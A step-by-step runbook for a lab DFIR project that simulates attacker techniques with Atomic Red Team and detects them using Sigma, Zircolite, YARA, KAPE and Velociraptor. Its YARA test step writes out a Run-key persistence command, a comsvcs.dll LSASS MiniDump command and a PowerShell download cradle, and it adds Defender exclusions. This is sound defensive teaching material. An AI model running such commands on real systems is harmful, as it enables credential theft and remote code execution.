# Runbook: finish the project step by step

Screenshot numbers (`[S07]`) refer to the **Screenshots_Checklist.xlsx** rows. Take each screenshot at the moment it is listed.
"Victim" = Victim-DFIR VM (elevated PowerShell). "Analyst" = the machine where you run Python (your host or an Analyst VM). Commands are given for Windows PowerShell; Linux/macOS equivalents are noted when they differ.

| Phase | What | Time | Where |
|---|---|---|---|
| 0 | Prepare the project folder | 10 min | Analyst |
| 1 | Run the four simulations, export logs | 45 min | Victim |
| 2 | Sigma + Zircolite detection | 30 min | Analyst |
| 3 | Dashboard | 20 min | Analyst |
| 4 | YARA | 30 min | Victim or Analyst |
| 5 | IOC list and enrichment | 20 min | Analyst |
| 6 | KAPE triage | 20 min | Victim |
| 7 | Velociraptor | 60-90 min | Analyst + Victim |
| 8 | End-to-end test and GitHub | 30 min | Analyst |

Phases 1 to 3 are the core: after them, simulation, detection and dashboard all work. If time runs out, cut Phase 7 first.

---

## Phase 0: Prepare (10 min)

1. Unzip `dfir-framework` on the Analyst, open a terminal in that folder.
2. Create a Python environment and install the dashboard dependencies:
   ```powershell
   python -m venv .venv
   .\.venv\Scripts\Activate.ps1          # Linux/macOS: source .venv/bin/activate
   pip install -r dashboard/requirements.txt yara-python
   ```
3. Install Zircolite (once):
   ```powershell
   git clone https://github.com/wagga40/Zircolite
   cd Zircolite; pip install .; cd ..
   ```
   If `pip install .` fails on Windows (compiler error), download the release binary from the Zircolite GitHub Releases page and use its path in Phase 2.
4. Get the two scripts onto the Victim: VirtualBox shared folder (Devices > Shared Folders) or drag and drop, or paste the file text into PowerShell ISE. Files: `scripts/01_run_atomics.ps1`, `scripts/kape_triage.ps1`.

## Phase 1: Simulations on the Victim (45 min)

1. **Snapshot** the Victim now: name it `pre-simulation`. [S04]
2. Confirm Sysmon is running and the Defender exclusions are in place:
   ```powershell
   Get-Service Sysmon64
   (Get-MpPreference).ExclusionPath
   ```
   [S05] [S14]
3. List the Atomic tests so the numbers in the script match your Atomic version:
   ```powershell
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
   Invoke-AtomicTest T1059.001 -ShowDetailsBrief
   Invoke-AtomicTest T1547.001 -ShowDetailsBrief
   Invoke-AtomicTest T1053.005 -ShowDetailsBrief
   Invoke-AtomicTest T1003.001 -ShowDetailsBrief
   ```
   Pick tests that do not need a download (T1059.001: an obfuscation or encoded-command test; T1003.001: the `comsvcs.dll` MiniDump test). Edit the `$Plan` table at the top of `01_run_atomics.ps1` if needed.
4. Run it:
   ```powershell
   Set-ExecutionPolicy -Scope Process Bypass -Force
   .\01_run_atomics.ps1
   ```
   [S07] [S08] [S09] [S10]. The script clears the Sysmon log before each technique, so each `.evtx` holds one technique. It also adds a benign command for T1059.001 and T1053.005 so those rules always have something to hit.
5. If a test fails or Defender blocks it, **screenshot the error** [S15] [S31]. A Defender block on T1003.001 is normal; the Sysmon events still exist and still count.
6. The live Sysmon log only holds the last technique (the script clears it each time), so open each exported file instead: Event Viewer > Action > Open Saved Log > `C:\logs\T1547.001.evtx` (and the others). Screenshot the key event of each technique: ID 13 for the Run key, ID 1 for schtasks, ID 10 for LSASS. [S06] [S11] [S12] [S13]
7. Copy `C:\logs\*.evtx` and `C:\logs\hashes.txt` to the Analyst `logs\` folder (shared folder or drag and drop).
8. On the Analyst, check integrity (evidence handling point for the report):
   ```powershell
   Get-FileHash logs\*.evtx -Algorithm SHA256
   ```
   The hashes must match `hashes.txt`.

## Phase 2: Detection with Sigma and Zircolite (30 min)

1. Run the detection script:
   ```powershell
   python scripts/02_detect.py --zircolite .\Zircolite\zircolite.py
   ```
   Add `--community` to also run Zircolite's bundled Sysmon ruleset (more coverage and a good fallback).
2. Expected: one JSON per log in `dashboard/data/` and a summary panel per log showing the rules that matched. [S16] [S17]
3. If a rule shows no match:
   - Confirm the event exists in the log (Event Viewer, Event ID 1 / 10 / 13).
   - Compare the field values (`CommandLine`, `TargetObject`, `GrantedAccess`) with the rule in `sigma/`, and adjust the `contains` or `GrantedAccess` lists to your real values. Writing down what you changed is good material for the Difficulties section.
   - Run with `--community` to see whether the bundled rules catch it.

## Phase 3: Dashboard (20 min)

```powershell
python dashboard/app.py
```
Open http://127.0.0.1:5000.

- Detections table with filters (technique, level, log file, free text), ATT&CK coverage panel, per-detection detail page. [S18] [S19] [S21]
- Test the UI before real data exists with `$env:DEMO=1; python dashboard/app.py` (Linux/macOS: `DEMO=1 python dashboard/app.py`). The yellow banner marks demo mode. **Never screenshot demo mode for the report.**

## Phase 4: YARA (30 min)

1. Create a small test folder (add it to the Defender exclusions first) with files that match the rules:
   ```powershell
   mkdir C:\yara_test
   'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /d C:\x.exe' | Set-Content C:\yara_test\persist.txt
   'rundll32 comsvcs.dll, MiniDump 123 C:\d.dmp full'                              | Set-Content C:\yara_test\dump.txt
   'IEX (New-Object Net.WebClient).DownloadString("http://example.com/a.ps1")'     | Set-Content C:\yara_test\cradle.ps1
   ```
2. Scan (where the rules and Python are; copy `yara/` and `scripts/03_yara_scan.py` to the Victim, or copy `C:\yara_test` to the Analyst):
   ```powershell
   python scripts/03_yara_scan.py C:\yara_test
   ```
   Optional bigger scan: `C:\AtomicRedTeam\atomics` (expect many hits). [S25] [S26]
3. Alternative without Python: `yara64.exe -r yara\dfir_rules.yar C:\yara_test`.
4. Copy `dashboard/data/yara_hits.json` to the Analyst `dashboard/data/` if you scanned on the Victim.

## Phase 5: IOC list and enrichment (20 min)

1. Edit `iocs/seed_iocs.csv` so the values match what you really observed (Run key name, task name, dump file name).
2. Build the IOC file:
   ```powershell
   python scripts/04_enrich_iocs.py
   ```
   Optional VirusTotal lookups for hashes and public IPs (free key, 4 requests per minute):
   ```powershell
   $env:VT_API_KEY = "your_key"; python scripts/04_enrich_iocs.py
   ```
   Do not screenshot or commit the key.
3. Refresh the dashboard: the IOC and YARA panels fill in. [S20]

## Phase 6: KAPE triage (20 min)

On the Victim, adjust `$Kape` in `scripts/kape_triage.ps1` to your KAPE folder, then:
```powershell
.\kape_triage.ps1
```
Screenshot the command, the output folder, and one parsed artifact (open a collected event log or the Prefetch folder). [S23] [S24]
The optional `!EZParser` stage needs the EZ Tools downloaded (`.\Get-KAPEUpdate.ps1`), so skip it if time is short.

## Phase 7: Velociraptor (60-90 min, riskiest)

**Server (Analyst)**
1. Download the Velociraptor release for your OS from https://github.com/Velocidex/velociraptor/releases.
2. Generate the configs with the wizard:
   ```powershell
   .\velociraptor.exe config generate -i
   ```
   Choose self-signed certificates and the Analyst's **Host-only IP** (for example `192.168.56.x`) as the frontend address; keep the default ports (8000 for clients, 8889 for the GUI); create an admin user and password. It writes `server.config.yaml` and `client.config.yaml`.
3. Start the server:
   ```powershell
   .\velociraptor.exe --config server.config.yaml frontend -v
   ```
   Open https://<analyst-ip>:8889 and accept the certificate warning. [S27]

**Client (Victim)**
4. Copy `velociraptor.exe` (Windows build) and `client.config.yaml` to the Victim, then in elevated PowerShell:
   ```powershell
   .\velociraptor.exe --config client.config.yaml client -v
   ```
5. In the GUI, search `all`: the Victim appears. [S28] (If it does not: check the Victim can reach `<analyst-ip>:8000`, and that the Analyst firewall allows ports 8000 and 8889 on the Host-only adapter.)

**Hunting**
6. GUI > View Artifacts > "+" > paste `velociraptor/Custom.DFIR.ProjectHunt.yaml` > Save.
7. Select the client > Collected > New Collection > search `Custom.DFIR` > Launch. Open the results of `RunKeys`, `ScheduledTaskFiles` and `SysmonSuspiciousCommandLines`. [S29]
8. If a query errors, the column names differ in your version: run the same query with `SELECT *`, read the columns, adjust. Built-in artifacts also work for the same hunts: `Windows.System.Pslist`, `Windows.Sys.StartupItems`, `Windows.System.TaskScheduler`, `Windows.EventLogs.EvtxHunter`.

## Phase 8: End-to-end test and GitHub (30 min)

1. Revert the Victim to `pre-simulation`, delete the old `.evtx` files and `dashboard/data/*.json`, then repeat Phases 1, 2 and 3 once, in a single sitting. Screenshot simulation, detection and dashboard in one sequence. [S32]
2. Commit:
   ```powershell
   git init
   git add .
   git commit -m "DFIR framework: Sigma rules, YARA, dashboard, runbook"
   git branch -M main
   git remote add origin https://github.com/<you>/<repo>.git
   git push -u origin main
   ```
   Raw `.evtx` files are excluded by `.gitignore` (the SHA256 list documents them). [S22]

---

## Troubleshooting

| Problem | Fix |
|---|---|
| `running scripts is disabled` | `Set-ExecutionPolicy -Scope Process Bypass -Force` in the same window |
| Defender deletes a script or tool | Add the folder to the exclusions; screenshot the alert for the report |
| Sysmon log is empty after the tests | `Get-Service Sysmon64`; check the config is loaded with `Sysmon64 -c`; re-run the technique |
| Zircolite: no detections | See Phase 2 step 3; try `--community`; check the log really contains the event ID |
| `pip install .` fails for Zircolite on Windows | Use the release binary and pass its path to `--zircolite` |
| `yara-python` will not install | Use `yara64.exe` (Phase 4 step 3) and fill the dashboard with `--community` results instead |
| Dashboard empty | Files must be in `dashboard/data/`; check the JSON files exist and the terminal shows no error |
| Velociraptor client does not connect | Frontend address must be the Analyst Host-only IP; check ports 8000/8889 and the firewall |

## What changed from the original plan (for the journal and report)

- Analyst environment simplified: Python tools run on one analyst machine instead of a heavy separate stack.
- MISP/OpenCTI replaced by a lightweight IOC file (extracted from detections plus a seed list, optional VirusTotal enrichment). Reason: deployment cost and time.
- T1055 (process injection) moved to future work.
- YARA added late (file-based complement to the Sigma rules).
- Velociraptor server runs on the analyst machine instead of a dedicated VM (if you keep it that way).
- Zircolite reads the Sigma folder directly through the Sysmon pipeline, removing the separate conversion step.
